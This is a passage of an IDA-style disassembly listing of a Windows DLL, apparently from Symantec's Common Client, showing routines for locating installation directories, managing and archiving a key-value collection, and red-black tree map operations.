		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	esi		; int
		push	offset aCommonClientDe ; "Common Client	Decomposers"
		call	Ordinal184
		mov	bl, al
		test	bl, bl
		pop	ecx
		pop	ecx
		jnz	short loc_6AF35856
		push	offset aCinstalleda_14 ; "CInstalledApps::GetCCDecDirectory() :	F"...
		call	sub_6AF3101A
		pop	ecx
		lea	ecx, [ebp+var_4]
		call	sub_6AF318C3
		lea	eax, [ebp+var_4]
		push	eax
		call	sub_6AF35645
		mov	bl, al
		test	bl, bl
		pop	ecx
		jz	short loc_6AF35841
		push	offset aDecomposers ; "\\Decomposers"
		lea	eax, [ebp+var_4]
		push	eax		; int
		lea	eax, [ebp+var_8]
		push	eax		; int
		call	sub_6AF35385
		add	esp, 0Ch
		push	eax
		mov	ecx, esi
		call	sub_6AF31C41
		lea	ecx, [ebp+var_8]
		call	sub_6AF3789B
		push	dword ptr [esi]	; Args
		push	offset aCinstalleda_15 ; "CInstalledApps::GetCCDecDirectory() :	b"...
		call	sub_6AF31006
		pop	ecx
		jmp	short loc_6AF3584D
; ---------------------------------------------------------------------------

loc_6AF35841:				; CODE XREF: Ordinal190+3Ej
		push	offset aCinstalleda_16 ; "CInstalledApps::GetCCDecDirectory() :	u"...
		call	sub_6AF3102E
		xor	bl, bl

loc_6AF3584D:				; CODE XREF: Ordinal190+72j
		pop	ecx
		lea	ecx, [ebp+var_4]
		call	sub_6AF3789B

loc_6AF35856:				; CODE XREF: Ordinal190+1Bj
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn
Ordinal190	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_6AF3585C(char	*Dest, int)
sub_6AF3585C	proc near		; CODE XREF: Ordinal185+32p

var_4		= dword	ptr -4
Dest		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		lea	ecx, [ebp+var_4]
		call	sub_6AF318C3
		lea	eax, [ebp+var_4]
		push	eax
		call	sub_6AF35645
		test	al, al
		pop	ecx
		jnz	short loc_6AF3587B

loc_6AF35877:				; CODE XREF: sub_6AF3585C+40j
		xor	bl, bl
		jmp	short loc_6AF358A0
; ---------------------------------------------------------------------------

loc_6AF3587B:				; CODE XREF: sub_6AF3585C+19j
		push	[ebp+arg_4]	; int
		lea	eax, [ebp+var_4]
		push	[ebp+Dest]	; Dest
		push	eax		; int
		call	sub_6AF352E8
		add	esp, 0Ch
		test	al, al
		jnz	short loc_6AF3589E
		push	offset aCinstalleda_17 ; "CInstalledApps::GetSymSharedDirectory()"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF35877
; ---------------------------------------------------------------------------

loc_6AF3589E:				; CODE XREF: sub_6AF3585C+33j
		mov	bl, 1

loc_6AF358A0:				; CODE XREF: sub_6AF3585C+1Dj
		lea	ecx, [ebp+var_4]
		call	sub_6AF3789B
		mov	al, bl
		pop	ebx
		leave
		retn
sub_6AF3585C	endp

; Exported entry 185.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal185(char lpData, LPDWORD lpcbData)
		public Ordinal185
Ordinal185	proc near		; CODE XREF: Ordinal219j
					; DATA XREF: .rdata:off_6AF66098o

lpData		= byte ptr  4
lpcbData	= dword	ptr  8

		push	ebx
		push	esi
		mov	esi, [esp+8+lpcbData]
		push	edi
		mov	edi, [esi]
		push	esi		; lpcbData
		push	dword ptr [esp+10h+lpData] ; lpData
		push	offset aCommonClient ; "Common Client"
		call	Ordinal183
		mov	bl, al
		add	esp, 0Ch
		test	bl, bl
		jnz	short loc_6AF35909
		push	offset aCinstalledap_9 ; "CInstalledApps::GetCCDirectory() : Fail"...
		call	sub_6AF3101A
		push	esi		; int
		push	dword ptr [esp+14h+lpData] ; Dest
		mov	[esi], edi
		call	sub_6AF3585C
		mov	bl, al
		add	esp, 0Ch
		test	bl, bl
		jnz	short loc_6AF358F9
		push	offset aCinstalleda_10 ; "CInstalledApps::GetCCDirectory() : unab"...
		call	sub_6AF3102E
		jmp	short loc_6AF35908
; ---------------------------------------------------------------------------

loc_6AF358F9:				; CODE XREF: Ordinal185+3Ej
		push	dword ptr [esp+0Ch+lpData] ; Args
		push	offset aCinstalleda_11 ; "CInstalledApps::GetCCDirectory() : back"...
		call	sub_6AF31006
		pop	ecx

loc_6AF35908:				; CODE XREF: Ordinal185+4Aj
		pop	ecx

loc_6AF35909:				; CODE XREF: Ordinal185+1Fj
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		retn
Ordinal185	endp

; Exported entry 189.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal189(char *Dest, int)
		public Ordinal189
Ordinal189	proc near		; DATA XREF: .rdata:off_6AF66098o

var_4		= dword	ptr -4
Dest		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		lea	ecx, [ebp+var_4]
		call	sub_6AF318C3
		lea	eax, [ebp+var_4]
		push	eax
		call	Ordinal190
		cmp	al, 1
		pop	ecx
		jnz	short loc_6AF35940
		push	[ebp+arg_4]	; int
		lea	eax, [ebp+var_4]
		push	[ebp+Dest]	; Dest
		push	eax		; int
		call	sub_6AF352E8
		add	esp, 0Ch
		mov	bl, al
		jmp	short loc_6AF3594D
; ---------------------------------------------------------------------------

loc_6AF35940:				; CODE XREF: Ordinal189+19j
		push	offset aCinstalleda_18 ; "CInstalledApps::GetCCDecDirectory() :	F"...
		call	sub_6AF3101A
		pop	ecx
		xor	bl, bl

loc_6AF3594D:				; CODE XREF: Ordinal189+2Fj
		lea	ecx, [ebp+var_4]
		call	sub_6AF3789B
		mov	al, bl
		pop	ebx
		leave
		retn
Ordinal189	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_6AF35A55

loc_6AF3595A:				; CODE XREF: sub_6AF35A55+3j
					; sub_6AF52F93+6j
		add	ecx, 8
		jmp	Ordinal246
; END OF FUNCTION CHUNK	FOR sub_6AF35A55

; =============== S U B	R O U T	I N E =======================================


sub_6AF35962	proc near		; CODE XREF: sub_6AF35D39+100p
					; sub_6AF35D39+116p ...

arg_0		= dword	ptr  4

		mov	edx, [esp+arg_0]
		mov	eax, [edx]
		push	esi
		mov	esi, [eax+8]
		mov	[edx], esi
		mov	esi, [eax+8]
		cmp	byte ptr [esi+61h], 0
		jnz	short loc_6AF3597A
		mov	[esi+4], edx

loc_6AF3597A:				; CODE XREF: sub_6AF35962+13j
		mov	esi, [edx+4]
		mov	[eax+4], esi
		mov	ecx, [ecx+4]
		cmp	edx, [ecx+4]
		pop	esi
		jnz	short loc_6AF3598E
		mov	[ecx+4], eax
		jmp	short loc_6AF3599D
; ---------------------------------------------------------------------------

loc_6AF3598E:				; CODE XREF: sub_6AF35962+25j
		mov	ecx, [edx+4]
		cmp	edx, [ecx+8]
		jnz	short loc_6AF3599B
		mov	[ecx+8], eax
		jmp	short loc_6AF3599D
; ---------------------------------------------------------------------------

loc_6AF3599B:				; CODE XREF: sub_6AF35962+32j
		mov	[ecx], eax

loc_6AF3599D:				; CODE XREF: sub_6AF35962+2Aj
					; sub_6AF35962+37j
		mov	[eax+8], edx
		mov	[edx+4], eax
		retn	4
sub_6AF35962	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF359A6	proc near		; CODE XREF: sub_6AF36793+40p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_0]
		mov	eax, [eax]
		push	esi
		push	[esp+4+arg_4]
		mov	esi, ecx
		lea	ecx, [esi+8]
		mov	[esi], eax
		call	Ordinal247
		mov	eax, esi
		pop	esi
		retn	8
sub_6AF359A6	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF359C3	proc near		; CODE XREF: Ordinal213+4Ep
					; Ordinal218+7Bp ...
		mov	eax, [ecx]
		push	ebx
		xor	bl, bl
		cmp	[eax+61h], bl
		jnz	short loc_6AF359F7
		mov	edx, [eax+8]
		cmp	[edx+61h], bl
		jnz	short loc_6AF359ED
		jmp	short loc_6AF359D9
; ---------------------------------------------------------------------------

loc_6AF359D7:				; CODE XREF: sub_6AF359C3+1Bj
		mov	edx, eax

loc_6AF359D9:				; CODE XREF: sub_6AF359C3+12j
		mov	eax, [edx]
		cmp	[eax+61h], bl
		jz	short loc_6AF359D7
		mov	[ecx], edx
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_6AF359E4:				; CODE XREF: sub_6AF359C3+30j
		mov	edx, [ecx]
		cmp	edx, [eax+8]
		jnz	short loc_6AF359F5
		mov	[ecx], eax

loc_6AF359ED:				; CODE XREF: sub_6AF359C3+10j
		mov	eax, [eax+4]
		cmp	[eax+61h], bl
		jz	short loc_6AF359E4

loc_6AF359F5:				; CODE XREF: sub_6AF359C3+26j
		mov	[ecx], eax

loc_6AF359F7:				; CODE XREF: sub_6AF359C3+8j
		pop	ebx
		retn
sub_6AF359C3	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF359F9	proc near		; CODE XREF: sub_6AF361E8+57p
					; sub_6AF36397+65p
		mov	eax, [ecx]
		push	ebx
		xor	bl, bl
		cmp	[eax+61h], bl
		jz	short loc_6AF35A08
		mov	eax, [eax+8]
		jmp	short loc_6AF35A34
; ---------------------------------------------------------------------------

loc_6AF35A08:				; CODE XREF: sub_6AF359F9+8j
		mov	edx, [eax]
		cmp	[edx+61h], bl
		jnz	short loc_6AF35A27
		jmp	short loc_6AF35A13
; ---------------------------------------------------------------------------

loc_6AF35A11:				; CODE XREF: sub_6AF359F9+20j
		mov	edx, eax

loc_6AF35A13:				; CODE XREF: sub_6AF359F9+16j
		mov	eax, [edx+8]
		cmp	[eax+61h], bl
		jz	short loc_6AF35A11
		mov	[ecx], edx
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_6AF35A1F:				; CODE XREF: sub_6AF359F9+34j
		mov	edx, [ecx]
		cmp	edx, [eax]
		jnz	short loc_6AF35A2F
		mov	[ecx], eax

loc_6AF35A27:				; CODE XREF: sub_6AF359F9+14j
		mov	eax, [eax+4]
		cmp	[eax+61h], bl
		jz	short loc_6AF35A1F

loc_6AF35A2F:				; CODE XREF: sub_6AF359F9+2Aj
		cmp	[eax+61h], bl
		jnz	short loc_6AF35A36

loc_6AF35A34:				; CODE XREF: sub_6AF359F9+Dj
		mov	[ecx], eax

loc_6AF35A36:				; CODE XREF: sub_6AF359F9+39j
		pop	ebx
		retn
sub_6AF359F9	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF35A38	proc near		; CODE XREF: sub_6AF35B1B+1Dp

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	esi
		mov	esi, ecx
		mov	ecx, [eax]
		add	eax, 8
		mov	[esi], ecx
		push	eax
		lea	ecx, [esi+8]
		call	Ordinal247
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF35A38	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF35A55	proc near		; CODE XREF: sub_6AF361AF+1Fp

; FUNCTION CHUNK AT 6AF3595A SIZE 00000008 BYTES

		add	ecx, 10h
		jmp	loc_6AF3595A
sub_6AF35A55	endp

; Exported entry 209.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal209
Ordinal209	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [esi+80h]
		mov	ecx, [ebp+arg_0]
		mov	[ecx], eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	al, 1
		pop	esi
		leave
		retn	4
Ordinal209	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF35A90	proc near		; CODE XREF: sub_6AF35D39+E2p
					; sub_6AF35D39+134p ...

arg_0		= dword	ptr  4

		mov	edx, [esp+arg_0]
		mov	eax, [edx+8]
		push	esi
		mov	esi, [eax]
		mov	[edx+8], esi
		mov	esi, [eax]
		cmp	byte ptr [esi+61h], 0
		jnz	short loc_6AF35AA8
		mov	[esi+4], edx

loc_6AF35AA8:				; CODE XREF: sub_6AF35A90+13j
		mov	esi, [edx+4]
		mov	[eax+4], esi
		mov	ecx, [ecx+4]
		cmp	edx, [ecx+4]
		pop	esi
		jnz	short loc_6AF35ABC
		mov	[ecx+4], eax
		jmp	short loc_6AF35ACA
; ---------------------------------------------------------------------------

loc_6AF35ABC:				; CODE XREF: sub_6AF35A90+25j
		mov	ecx, [edx+4]
		cmp	edx, [ecx]
		jnz	short loc_6AF35AC7
		mov	[ecx], eax
		jmp	short loc_6AF35ACA
; ---------------------------------------------------------------------------

loc_6AF35AC7:				; CODE XREF: sub_6AF35A90+31j
		mov	[ecx+8], eax

loc_6AF35ACA:				; CODE XREF: sub_6AF35A90+2Aj
					; sub_6AF35A90+35j
		mov	[eax], edx
		mov	[edx+4], eax
		retn	4
sub_6AF35A90	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF35AD2	proc near		; CODE XREF: sub_6AF35B4E+Ap

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	sub_6AF33374
		mov	ecx, [esp+4+arg_0]
		test	ecx, ecx
		jz	short loc_6AF35AEC
		mov	eax, [ecx]
		push	esi
		push	offset dword_6AF5449C
		call	dword ptr [eax]

loc_6AF35AEC:				; CODE XREF: sub_6AF35AD2+Ej
		mov	eax, [esi]
		pop	esi
		retn	4
sub_6AF35AD2	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF35AF2	proc near		; CODE XREF: sub_6AF35CDA+Cp
					; sub_6AF36793+19p

arg_0		= dword	ptr  4

		mov	eax, [ecx+4]
		mov	ecx, [eax+4]
		cmp	byte ptr [ecx+61h], 0
		jnz	short locret_6AF35B18
		mov	edx, [esp+arg_0]
		mov	edx, [edx]

loc_6AF35B04:				; CODE XREF: sub_6AF35AF2+24j
		cmp	[ecx+10h], edx
		jnb	short loc_6AF35B0E
		mov	ecx, [ecx+8]
		jmp	short loc_6AF35B12
; ---------------------------------------------------------------------------

loc_6AF35B0E:				; CODE XREF: sub_6AF35AF2+15j
		mov	eax, ecx
		mov	ecx, [ecx]

loc_6AF35B12:				; CODE XREF: sub_6AF35AF2+1Aj
		cmp	byte ptr [ecx+61h], 0
		jz	short loc_6AF35B04

locret_6AF35B18:			; CODE XREF: sub_6AF35AF2+Aj
		retn	4
sub_6AF35AF2	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF35B1B	proc near		; CODE XREF: sub_6AF35B8D+23p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		push	esi
		push	[ebp+arg_C]
		mov	esi, ecx
		mov	[esi], eax
		mov	eax, [ebp+arg_4]
		mov	[esi+4], eax
		mov	eax, [ebp+arg_8]
		lea	ecx, [esi+10h]
		mov	[esi+8], eax
		call	sub_6AF35A38
		mov	al, [ebp+arg_10]
		mov	[esi+60h], al
		mov	byte ptr [esi+61h], 0
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	14h
sub_6AF35B1B	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF35B4E	proc near		; CODE XREF: Ordinal212+2Ap

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		and	dword ptr [esi], 0
		call	sub_6AF35AD2
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF35B4E	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF35B63	proc near		; CODE XREF: sub_6AF35D14+3p
		push	68h		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		xor	edx, edx
		cmp	eax, edx
		pop	ecx
		jz	short loc_6AF35B73
		mov	[eax], edx

loc_6AF35B73:				; CODE XREF: sub_6AF35B63+Cj
		lea	ecx, [eax+4]
		cmp	ecx, edx
		jz	short loc_6AF35B7C
		mov	[ecx], edx

loc_6AF35B7C:				; CODE XREF: sub_6AF35B63+15j
		lea	ecx, [eax+8]
		cmp	ecx, edx
		jz	short loc_6AF35B85
		mov	[ecx], edx

loc_6AF35B85:				; CODE XREF: sub_6AF35B63+1Ej
		mov	byte ptr [eax+60h], 1
		mov	[eax+61h], dl
		retn
sub_6AF35B63	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF35B8D	proc near		; CODE XREF: sub_6AF35D39+5Ep
					; sub_6AF36279+38p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	esi
		push	68h		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	esi, eax
		test	esi, esi
		pop	ecx
		jz	short loc_6AF35BB5
		push	[ebp+arg_10]
		mov	ecx, esi
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF35B1B

loc_6AF35BB5:				; CODE XREF: sub_6AF35B8D+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	14h
sub_6AF35B8D	endp

; Exported entry 213.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal213
Ordinal213	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		mov	ebx, [ebp+arg_4]
		push	esi
		push	edi
		xor	edi, edi
		mov	esi, ecx
		push	edi
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[ebx], edi
		call	Ordinal1228
		mov	eax, [ebp+arg_0]
		cmp	eax, [esi+80h]
		jb	short loc_6AF35BF7
		push	offset aCkeyvaluecolle ; "CKeyValueCollection::GetKeyAt() : dwInd"...
		call	sub_6AF3102E
		pop	ecx
		xor	bl, bl
		jmp	short loc_6AF35C1F
; ---------------------------------------------------------------------------

loc_6AF35BF7:				; CODE XREF: Ordinal213+2Aj
		mov	esi, [esi+7Ch]
		mov	eax, [esi]
		mov	[ebp+arg_4], eax
		jmp	short loc_6AF35C12
; ---------------------------------------------------------------------------

loc_6AF35C01:				; CODE XREF: Ordinal213+58j
		cmp	edi, [ebp+arg_0]
		jz	short loc_6AF35C18
		lea	ecx, [ebp+arg_4]
		inc	edi
		call	sub_6AF359C3
		mov	eax, [ebp+arg_4]

loc_6AF35C12:				; CODE XREF: Ordinal213+43j
		cmp	eax, esi
		jnz	short loc_6AF35C01
		jmp	short loc_6AF35C1D
; ---------------------------------------------------------------------------

loc_6AF35C18:				; CODE XREF: Ordinal213+48j
		mov	eax, [eax+10h]
		mov	[ebx], eax

loc_6AF35C1D:				; CODE XREF: Ordinal213+5Aj
		mov	bl, 1

loc_6AF35C1F:				; CODE XREF: Ordinal213+39j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal213	endp

; Exported entry 218.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal218
Ordinal218	proc near		; DATA XREF: .rdata:6AF56104o
					; .rdata:off_6AF66098o

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	edi
		push	ebx
		mov	edi, ecx
		call	Ordinal297
		test	al, al
		jnz	short loc_6AF35C4C
		push	offset aCkeyvaluecol_0 ; "CKeyValueCollection::SaveArchive() : CV"...
		jmp	short loc_6AF35C6F
; ---------------------------------------------------------------------------

loc_6AF35C4C:				; CODE XREF: Ordinal218+13j
		push	1
		mov	ecx, ebx
		call	Ordinal330
		test	eax, eax
		jz	short loc_6AF35C6A
		push	dword ptr [edi+80h]
		mov	ecx, ebx
		call	Ordinal324
		test	eax, eax
		jnz	short loc_6AF35C79

loc_6AF35C6A:				; CODE XREF: Ordinal218+27j
		push	offset aCkeyvaluecol_1 ; "CKeyValueCollection::SaveArchive() : Ar"...

loc_6AF35C6F:				; CODE XREF: Ordinal218+1Aj
		call	sub_6AF3102E
		pop	ecx
		xor	al, al
		jmp	short loc_6AF35CD4
; ---------------------------------------------------------------------------

loc_6AF35C79:				; CODE XREF: Ordinal218+38j
		mov	eax, [edi+7Ch]
		push	esi		; Args
		mov	esi, [eax]
		cmp	esi, eax
		mov	byte ptr [ebp+arg_0+3],	1
		mov	[ebp+var_4], esi
		jz	short loc_6AF35CD0

loc_6AF35C8A:				; CODE XREF: Ordinal218+86j
		push	dword ptr [esi+10h]
		mov	ecx, ebx
		call	Ordinal324
		test	eax, eax
		jz	short loc_6AF35CBA
		add	esi, 18h
		push	esi
		push	ebx
		mov	ecx, edi
		call	Ordinal300
		test	al, al
		jz	short loc_6AF35CC1
		lea	ecx, [ebp+var_4]
		call	sub_6AF359C3
		mov	esi, [ebp+var_4]
		cmp	esi, [edi+7Ch]
		jnz	short loc_6AF35C8A
		jmp	short loc_6AF35CD0
; ---------------------------------------------------------------------------

loc_6AF35CBA:				; CODE XREF: Ordinal218+66j
		push	offset aCkeyvaluecol_1 ; "CKeyValueCollection::SaveArchive() : Ar"...
		jmp	short loc_6AF35CC6
; ---------------------------------------------------------------------------

loc_6AF35CC1:				; CODE XREF: Ordinal218+76j
		push	offset aCkeyvaluecol_2 ; "CKeyValueCollection::SaveArchive() : Sa"...

loc_6AF35CC6:				; CODE XREF: Ordinal218+8Fj
		call	sub_6AF3102E
		pop	ecx
		mov	byte ptr [ebp+arg_0+3],	0

loc_6AF35CD0:				; CODE XREF: Ordinal218+58j
					; Ordinal218+88j
		mov	al, byte ptr [ebp+arg_0+3]
		pop	esi

loc_6AF35CD4:				; CODE XREF: Ordinal218+47j
		pop	edi
		pop	ebx
		leave
		retn	4
Ordinal218	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF35CDA	proc near		; CODE XREF: Ordinal214+24p
					; Ordinal215+18p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		push	edi
		mov	esi, ecx
		call	sub_6AF35AF2
		mov	esi, [esi+4]
		cmp	eax, esi
		mov	[ebp+arg_4], eax
		jz	short loc_6AF35D01
		mov	ecx, [edi]
		cmp	ecx, [eax+10h]
		jb	short loc_6AF35D01
		lea	eax, [ebp+arg_4]
		jmp	short loc_6AF35D07
; ---------------------------------------------------------------------------

loc_6AF35D01:				; CODE XREF: sub_6AF35CDA+19j
					; sub_6AF35CDA+20j
		mov	[ebp+var_4], esi
		lea	eax, [ebp+var_4]

loc_6AF35D07:				; CODE XREF: sub_6AF35CDA+25j
		mov	ecx, [eax]
		mov	eax, [ebp+arg_0]
		pop	edi
		mov	[eax], ecx
		pop	esi
		leave
		retn	8
sub_6AF35CDA	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF35D14	proc near		; CODE XREF: sub_6AF3699A+3p
		push	esi
		mov	esi, ecx
		call	sub_6AF35B63
		lea	ecx, [esi+4]
		mov	[ecx], eax
		mov	byte ptr [eax+61h], 1
		mov	eax, [ecx]
		mov	[eax+4], eax
		mov	eax, [ecx]
		mov	[eax], eax
		mov	ecx, [ecx]
		mov	[ecx+8], ecx
		and	dword ptr [esi+8], 0
		pop	esi
		retn
sub_6AF35D14	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF35D39	proc near		; CODE XREF: sub_6AF361E8+71p
					; sub_6AF36397+19p ...

var_50		= dword	ptr -50h
var_28		= byte ptr -28h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= byte ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		mov	eax, offset unknown_libname_40 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		cmp	dword ptr [edi+8], 3333332h
		jb	short loc_6AF35D87
		push	offset aMapSetTTooLong ; "map/set<T> too long"
		lea	ecx, [ebp+var_28]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		lea	ecx, [ebp+var_50]
		call	sub_6AF3136A
		push	offset dword_6AF61E98
		lea	eax, [ebp+var_50]
		push	eax
		mov	[ebp+var_50], offset off_6AF54898
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF35D87:				; CODE XREF: sub_6AF35D39+19j
		mov	eax, [edi+4]
		mov	esi, [ebp+arg_8]
		push	0
		push	[ebp+arg_C]
		mov	ecx, edi
		push	eax
		push	esi
		push	eax
		call	sub_6AF35B8D
		inc	dword ptr [edi+8]
		mov	ebx, eax
		mov	eax, [edi+4]
		cmp	esi, eax
		jnz	short loc_6AF35DB5
		mov	[eax+4], ebx
		mov	eax, [edi+4]
		mov	[eax], ebx
		mov	eax, [edi+4]
		jmp	short loc_6AF35DD3
; ---------------------------------------------------------------------------

loc_6AF35DB5:				; CODE XREF: sub_6AF35D39+6Dj
		cmp	[ebp+arg_4], 0
		jz	short loc_6AF35DC8
		mov	[esi], ebx
		mov	eax, [edi+4]
		cmp	esi, [eax]
		jnz	short loc_6AF35DD6
		mov	[eax], ebx
		jmp	short loc_6AF35DD6
; ---------------------------------------------------------------------------

loc_6AF35DC8:				; CODE XREF: sub_6AF35D39+80j
		mov	[esi+8], ebx
		mov	eax, [edi+4]
		cmp	esi, [eax+8]
		jnz	short loc_6AF35DD6

loc_6AF35DD3:				; CODE XREF: sub_6AF35D39+7Aj
		mov	[eax+8], ebx

loc_6AF35DD6:				; CODE XREF: sub_6AF35D39+89j
					; sub_6AF35D39+8Dj ...
		mov	esi, ebx
		lea	eax, [ebx+4]
		jmp	loc_6AF35E75
; ---------------------------------------------------------------------------

loc_6AF35DE0:				; CODE XREF: sub_6AF35D39+142j
		mov	ecx, [eax]
		mov	edx, [ecx+4]
		mov	edx, [edx]
		cmp	ecx, edx
		jnz	short loc_6AF35E40
		mov	edx, [ecx+4]
		mov	edx, [edx+8]
		cmp	byte ptr [edx+60h], 0
		jnz	short loc_6AF35E11

loc_6AF35DF7:				; CODE XREF: sub_6AF35D39+10Bj
		mov	ecx, [eax]
		mov	byte ptr [ecx+60h], 1
		mov	byte ptr [edx+60h], 1
		mov	ecx, [eax]
		mov	ecx, [ecx+4]
		mov	byte ptr [ecx+60h], 0
		mov	eax, [eax]
		mov	esi, [eax+4]
		jmp	short loc_6AF35E72
; ---------------------------------------------------------------------------

loc_6AF35E11:				; CODE XREF: sub_6AF35D39+BCj
		cmp	esi, [ecx+8]
		jnz	short loc_6AF35E20
		mov	esi, ecx
		push	esi
		mov	ecx, edi
		call	sub_6AF35A90

loc_6AF35E20:				; CODE XREF: sub_6AF35D39+DBj
		mov	eax, [esi+4]
		mov	byte ptr [eax+60h], 1
		mov	eax, [esi+4]
		mov	eax, [eax+4]
		mov	byte ptr [eax+60h], 0
		mov	eax, [esi+4]
		push	dword ptr [eax+4]
		mov	ecx, edi
		call	sub_6AF35962
		jmp	short loc_6AF35E72
; ---------------------------------------------------------------------------

loc_6AF35E40:				; CODE XREF: sub_6AF35D39+B0j
		cmp	byte ptr [edx+60h], 0
		jz	short loc_6AF35DF7
		cmp	esi, [ecx]
		jnz	short loc_6AF35E54
		mov	esi, ecx
		push	esi
		mov	ecx, edi
		call	sub_6AF35962

loc_6AF35E54:				; CODE XREF: sub_6AF35D39+10Fj
		mov	eax, [esi+4]
		mov	byte ptr [eax+60h], 1
		mov	eax, [esi+4]
		mov	eax, [eax+4]
		mov	byte ptr [eax+60h], 0
		mov	eax, [esi+4]
		push	dword ptr [eax+4]
		mov	ecx, edi
		call	sub_6AF35A90

loc_6AF35E72:				; CODE XREF: sub_6AF35D39+D6j
					; sub_6AF35D39+105j
		lea	eax, [esi+4]

loc_6AF35E75:				; CODE XREF: sub_6AF35D39+A2j
		mov	ecx, [eax]
		cmp	byte ptr [ecx+60h], 0
		jz	loc_6AF35DE0
		mov	eax, [edi+4]
		mov	eax, [eax+4]
		mov	ecx, [ebp+var_C]
		mov	byte ptr [eax+60h], 1
		mov	eax, [ebp+arg_0]
		pop	edi
		mov	[eax], ebx
		pop	esi
		pop	ebx
		mov	large fs:0, ecx
		leave
		retn	10h
sub_6AF35D39	endp

; Exported entry 214.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal214
Ordinal214	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= byte ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+arg_0]
		push	eax
